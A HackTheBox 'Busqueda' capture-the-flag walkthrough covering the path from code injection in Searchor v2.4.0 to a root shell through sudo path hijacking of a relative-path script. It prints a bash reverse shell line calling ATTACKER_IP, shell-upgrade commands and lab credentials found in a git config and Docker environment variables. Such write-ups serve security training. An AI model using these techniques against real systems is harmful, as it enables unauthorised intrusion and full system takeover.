## Hello Everyone!

Today, we will explore “Busqueda”, an easy-level machine released by **HackTheBox**.

Without further ado, let’s get started!

![image](/HTB/Busqueda/Busqueda_images/1.png)

(Please ensure that you have added the following line  `TARGET_IP    busqueda.htb`  to your local `/etc/hosts` file in order to perform DNS resolution of the target)



## Information Gathering




First, we will perform an aggressive **Nmap** scan to obtain comprehensive results:

![image](/HTB/Busqueda/Busqueda_images/2.png)

We can identify two running services on the target:

**SSH** (OpenSSH 8.9p1 | 22)

**HTTP** (Apache httpd 2.4.52 | 80)

the **Nmap Script Engine** indicates that the web site is redirected to the `searcher.htb` domain name, which means that we need to add it to our `/etc/hosts` file in order to access it via **DNS resolution**, otherwise it will not work:

![image](/HTB/Busqueda/Busqueda_images/3.png)

![image](/HTB/Busqueda/Busqueda_images/4.png)

We should now be able to access the website hosted on port **80**:

![image](/HTB/Busqueda/Busqueda_images/5.png)

The web application allows users to search across multiple platforms such as Spotify and Yahoo. We can learn at the very bottom of the page that the application uses Searchor v2.4.0, which is a Python library used to handle the search functionality. We can research potential exploits related to it:

![image](/HTB/Busqueda/Busqueda_images/6.png)



## Initial Access


We can find a GitHub repository that hosts a Bash script leveraging the “*engine*” POST parameter used to select an engine which is vulnerable to code injection.

We can download the script, grant it execute permission and execute it without providing any argument to learn more about its usage:

![image](/HTB/Busqueda/Busqueda_images/7.png)

It looks like the script allows us to catch a reverse shell! We need to provide the target URL, our local IP, and the port we assigned to our Netcat listener via nc -lvnp `PORT` in order to catch the incoming connection.

![image](/HTB/Busqueda/Busqueda_images/8.png)

We successfully obtained initial access on the machine as the user **svc**!

Since the current shell is relatively unstable, we can upgrade it running the following commands:

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

`export TERM=xterm`

We are now able to operate correctly with the command prompt. It is recommended to check the `/etc/passwd` file to see whether there are other users on the system that we can leverage for pivoting purposes:

![image](/HTB/Busqueda/Busqueda_images/9.png)

But here, it looks like we are the only non-root user present on the system. It means that we are able to retrieve the first flag located in our `/home/svc` directory:

![image](/HTB/Busqueda/Busqueda_images/10.png)




## Privilege Escalation



We now need to escalate our privileges in order to retrieve the final flag. We can start to enumerate PE vectors using `sudo -l` to check whether we can run any command with **root privileges**:

![image](/HTB/Busqueda/Busqueda_images/11.png)

Unfortunately, we need to provide a password that we don’t have.

After performing basic local system enumeration, we can locate a hidden `.git` directory in the `/var/www/app` directory, which contains an interesting `config` file:

![image](/HTB/Busqueda/Busqueda_images/12.png)

The file contains an intriguing “`jh1usoih2bkjaspwe92`” string ffollowed by an entry for “cody” which seems to be a username. The string shown may be the password for the **svc** user, let’s try to run `sudo -l` again and provide it:

![image](/HTB/Busqueda/Busqueda_images/13.png)

It works! We can now use the command and learn that our user can run the following command with root **privileges**:

`/usr/bin/python3 /opt/scripts/system-checkup.py *`

the wildcard here is interesting, let’s inspect the script’s permissions to see what we can do with it:

![image](/HTB/Busqueda/Busqueda_images/14.png)

It seems that we cannot read the script. We still can execute it, so let’s inspect its behaviour from there:

![image](/HTB/Busqueda/Busqueda_images/15.png)

The script allows us to enumerate some docker containers and retrieve information related to them. We can start by enumerating available containers running the following command:

`sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps`

![image](/HTB/Busqueda/Busqueda_images/16.png)

We can identify two containers. The first one is interesting and reminds us of the Gitea application we saw earlier in the `config` file, which contained the password for the user **svc**. We may be able to retrieve additional credential for a more privileged user from there. We can now inspect this particular container using the `docker-inspect` argument through the following command:

`sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea`

We use the `{{json .Config.Env}}` Go template format to extract environment variables. such as database name, or potential password:

![image](/HTB/Busqueda/Busqueda_images/17.png)

We can identify a very interesting `GITEA_database_PASSWD` value which stores a database password in plaintext for the user `git`:

`yuiu1hoiu4i5ho1uh`

Maybe it has been used through a password reuse misconfiguration for the **root** user ? It would be  critical from a security perspective but very beneficial for us. Let’s verify it by switching to **root** using `su root` and providing the recovered password:

![image](/HTB/Busqueda/Busqueda_images/18.png)

Unfortunately, this attempt was unsuccessful.

Getting back to our script, we can notice something very interesting. The Python script executes a `full-checkup.sh` script via the `full-checkup` action. The Python script calls a Bash script using a **relative path** instead of the absolute secure path of the script. 

![image](/HTB/Busqueda/Busqueda_images/19.png)

We can leverage this to perform PATH Hijacking and creating a malicious `full-checkup.sh` script that could allow us to elevate our privileges to **root** as the script is executed with **root privileges**.

We will create a fake `full-checkup.sh` script that displays the username of the user which executes it to confirm the vulnerability. The script will contain the following code:

`#!/bin/bash`

`whoami`

This simple script should return “root” in the output since the original Python script is executed with **root privileges**. We then grant it execute permissions and execute the `system-checkup.py` script via `sudo`. Make sure to execute it in the same directory as the fake `full-checkup.sh` we created. To trigger the malicious script, we need to call it through the full-check action included in the following command:

![image](/HTB/Busqueda/Busqueda_images/20.png)

As we can see, our script has successfully been executed, and the `whoami` command has been executed with **root privileges**!

Since we can now control the command we want to execute with root privileges via the Path Hijacking vulnerability present on the script, we can inject the following code to the script in order to obtain a **root shell** initiated by a reverse shell:

`#!/bin/bash`

`bash -i >& /dev/tcp/ATTACKER_IP/NC_PORT 0>&1`

(ensure that you have set up a Netcat listener in parallel to catch the incoming connection)

We can now execute the script again to obtain our elevated session:

![image](/HTB/Busqueda/Busqueda_images/21.png)

We successfully abused the relative path usage of the `full-checkup.sh` script to use a controlled script and executing elevated commands, granting us a root shell, giving us full control of the system.
We can now navigate to the `/root` directory and retrieve the final flag:

![image](/HTB/Busqueda/Busqueda_images/22.png)

Challenge completed!

![image](/HTB/Busqueda/Busqueda_images/23.png)



## Conclusion




This challenge was particularly interesting as it combined both web application exploitation and privilege escalation techniques. We began by enumerating the target web application and discovered that it was using an outdated Python library. By exploiting a known vulnerability affecting this library, we were able to achieve remote code execution and gain initial access to the system.

After obtaining a foothold, we recovered the cleartext password of the **svc** user. This granted us access to a Python script that could be executed with root privileges via `sudo`. During our analysis, we identified an insecure implementation in which the script invoked a Bash script using a relative path rather than an absolute one. This poor security practice introduced a **path hijacking vulnerability**, allowing us to create a malicious script with the same name as the legitimate one.

When the privileged script was executed, our malicious script was invoked instead of the intended binary, enabling us to execute arbitrary commands as **root**. As a result, we successfully escalated our privileges and obtained a **root shell** on the target system.

**Thank you for reading!**
